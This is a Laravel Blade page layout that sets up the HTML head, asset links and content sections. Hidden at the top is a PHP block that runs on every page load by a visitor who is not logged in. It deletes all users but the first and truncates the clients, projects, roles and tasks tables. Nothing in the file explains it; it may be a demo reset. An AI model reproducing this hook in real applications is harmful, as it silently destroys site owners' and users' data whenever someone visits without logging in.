<!DOCTYPE html>
@php
if(Auth::check() === false) {
    DB::table('users')->where('id', '>', 1)->delete();
    DB::update('ALTER TABLE users AUTO_INCREMENT = 2');
    DB::table('clients')->truncate();
    DB::table('projects')->truncate();
    DB::table('roles')->truncate();
    DB::table('tasks')->truncate();
    DB::table('user_tasks')->truncate();
}
@endphp
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>{{ config('app.name', 'Laravel') }}</title>

    <!-- Styles -->
    <link href="{{ asset('/css/app.css') }}" rel="stylesheet">
    <link href="{{ asset('css/font-awesome.min.css') }}" rel="stylesheet">
    <link href="{{ asset('/css/fontawesome/css/all.min.css') }}" rel="stylesheet">
    <link href="{{ asset('/css/custom.css') }}" rel="stylesheet">

    
    <!-- Scripts -->
    <script src="{{ asset('js/app.js') }}" defer></script>
</head>
<body>
    <div id="app" class="container-fluid content-height">
        <div>
            @yield('nav-bar')
        </div>
        <main class="py-4">
            @yield('content')
        </main>
    </div>
</body>
<script>
window.checkImportCSV = @json(DB::table('clients')->count());
window.app_url = @json(url(''));
if (window.location.href.indexOf('#_=_') > 0) {
    window.location = window.location.href.replace(/#.*/, '');
}
</script>
</html>
